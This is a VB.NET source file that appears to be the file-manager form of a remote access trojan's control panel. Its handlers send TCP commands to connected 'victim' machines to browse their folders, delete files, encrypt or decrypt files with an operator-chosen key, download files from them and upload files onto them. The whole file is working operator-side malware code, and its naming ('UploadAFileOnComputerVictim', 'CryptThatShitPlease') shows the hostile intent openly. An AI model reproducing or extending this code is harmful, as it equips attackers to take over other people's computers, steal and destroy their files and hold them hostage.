﻿Imports System.Net.Sockets
Imports System.Text

Public Class FMM
    Private Sub lv_DrawColumnHeader(ByVal sender As Object, ByVal e As DrawListViewColumnHeaderEventArgs)
        e.Graphics.FillRectangle(Brushes.GreenYellow, e.Bounds)
        e.DrawText()
    End Sub


    Private Sub GoToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles GoToolStripMenuItem.Click

        Dim theendpoint As String = Me.Text

        Dim Folder As String = Label3.Text & "\"

        '      Dim wheretogo As String = ListView1.SelectedItems(0).Text + "\" + "@wheretogo"
        Dim wheretogo As String = ListView1.SelectedItems(0).Text + "@wheretogo"

            Dim AllToSend As String = Folder + wheretogo

            Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
            For Each client As TcpClient In Heathen.LesClients

                If theendpoint = client.Client.RemoteEndPoint.ToString Then

                    Try
                    client.GetStream().Write(buffer, 0, buffer.Length)
                Catch ex As Exception

                        MessageBox.Show("The client seems to be offline")
                    End Try
                End If

            Next

    End Sub

    Private Sub BackToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles BackToolStripMenuItem.Click
        If Label3.Text.Count = 3 Then
            MessageBox.Show("Can't go back")
        Else
            Dim theendpoint As String = Me.Text



        Dim wheretogo As String = Label3.Text.Split("/").Last() + "@ShitWegoback"


        Dim AllToSend As String = wheretogo

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
        End If
    End Sub

    Private Sub DeleteToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DeleteToolStripMenuItem.Click
        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
        Dim theendpoint As String = Me.Text
        Dim Itstimetodeleteselectedfile As String
        If ListView1.SelectedItems(0).ImageKey = "files" Then


            Itstimetodeleteselectedfile = "@DELETETHISHIT" + "FILES"

        ElseIf ListView1.SelectedItems(0).ImageKey = "folders" Then

            Itstimetodeleteselectedfile = "@DELETETHISHIT" + "FOLDERS"
        End If

        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next

    End Sub

    Private Sub ComboBox1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles ComboBox1.SelectedIndexChanged
        Dim NewDrive As String = ComboBox1.Text

        Dim theendpoint As String = Me.Text




        Dim allstr As String = "TimetoChangeVolume" + "\" + NewDrive

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(allstr)


        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then
                '    MessageBox.Show(client.Client.RemoteEndPoint.ToString)
                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next


    End Sub

    Private Sub FMM_Load(sender As Object, e As EventArgs) Handles MyBase.Load

    End Sub

    Private Sub Label3_Click(sender As Object, e As EventArgs) Handles Label3.Click

    End Sub

    Private Sub Label3_TextChanged(sender As Object, e As EventArgs) Handles Label3.TextChanged
        If Label3.Text.Contains("\\") Then
            Label3.Text.Replace("\\", "\")
        End If
    End Sub

    Private Sub EncryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles EncryptToolStripMenuItem.Click
        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
        Dim theendpoint As String = Me.Text
        Dim Itstimetodeleteselectedfile As String
        Dim o As String = InputBox("Put a key to encrypt : ")
        If ListView1.SelectedItems(0).ImageKey = "files" Then


            Itstimetodeleteselectedfile = "\CryptThatShitPlease/" + o

            '       ElseIf ListView1.SelectedItems(0).ImageKey = "folders" Then
        Else
            MessageBox.Show("You've selected a folder !")
            '   Itstimetodeleteselectedfile = "CryptThatShitPlease" + "FOLDERS" + o
        End If

        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
    End Sub

    Private Sub DecryptToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DecryptToolStripMenuItem.Click
        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
        Dim theendpoint As String = Me.Text
        Dim Itstimetodeleteselectedfile As String
        Dim o As String = InputBox("Put a key to decrypt : ")
        If ListView1.SelectedItems(0).ImageKey = "files" Then


            Itstimetodeleteselectedfile = "\WhyDecrypt/" + o


        Else
            MessageBox.Show("You've selected a folder !")

        End If

        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
    End Sub

    Private Sub ListView1_MouseDoubleClick(sender As Object, e As MouseEventArgs) Handles ListView1.MouseDoubleClick

        Dim theendpoint As String = Me.Text

        Dim Folder As String = Label3.Text & "\"

        '      Dim wheretogo As String = ListView1.SelectedItems(0).Text + "\" + "@wheretogo"
        Dim wheretogo As String = ListView1.SelectedItems(0).Text + "@wheretogo"

        Dim AllToSend As String = Folder + wheretogo

        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length)
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
    End Sub

    Private Sub DownloadThisFileToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DownloadThisFileToolStripMenuItem.Click
        Dim ThefileOrFolrderToDelete As String = Label3.Text + "\" + ListView1.SelectedItems(0).Text
        Dim theendpoint As String = Me.Text
        Dim Itstimetodeleteselectedfile As String

        If ListView1.SelectedItems(0).ImageKey = "files" Then


            Itstimetodeleteselectedfile = "\DownloadThisFilePlease/"

            '       ElseIf ListView1.SelectedItems(0).ImageKey = "folders" Then
        Else
            MessageBox.Show("You've selected a folder !")
            '   Itstimetodeleteselectedfile = "CryptThatShitPlease" + "FOLDERS" + o
        End If

        Dim AllToSend As String = ThefileOrFolrderToDelete + Itstimetodeleteselectedfile


        Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
        For Each client As TcpClient In Heathen.LesClients

            If theendpoint = client.Client.RemoteEndPoint.ToString Then

                Try
                    client.GetStream().Write(buffer, 0, buffer.Length) '''
                Catch ex As Exception

                    MessageBox.Show("The client seems to be offline")
                End Try
            End If

        Next
    End Sub

    Private Sub UploadAFileOnComputerVictimToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles UploadAFileOnComputerVictimToolStripMenuItem.Click
        If ListView1.SelectedItems(0).ImageKey = "folders" Then

            If OpenFileDial1.ShowDialog = DialogResult.OK Then
                Dim SFile As String = Convert.ToBase64String(IO.File.ReadAllBytes(OpenFileDial1.FileName))
                Dim theendpoint As String = Me.Text
                Dim EndName As String() = Split(OpenFileDial1.FileName, "\")

                MessageBox.Show(EndName(EndName.Length - 1))
                '      Dim wheretogo As String = ListView1.SelectedItems(0).Text + "\" + "@wheretogo"
                Dim wheretowriteIT As String = "\\\UploadThereSir///" + ListView1.SelectedItems(0).Text + "\" + EndName(EndName.Length - 1)

                Dim AllToSend As String = SFile + wheretowriteIT

                Dim buffer() As Byte = Encoding.UTF8.GetBytes(AllToSend)
                For Each client As TcpClient In Heathen.LesClients

                    If theendpoint = client.Client.RemoteEndPoint.ToString Then

                        Try
                            client.GetStream().Write(buffer, 0, buffer.Length)
                        Catch ex As Exception

                            MessageBox.Show("The client seems to be offline")
                        End Try
                    End If

                Next
            End If
        Else
            MessageBox.Show("You've selected a file as destination of uploading !")
        End If

    End Sub
End Class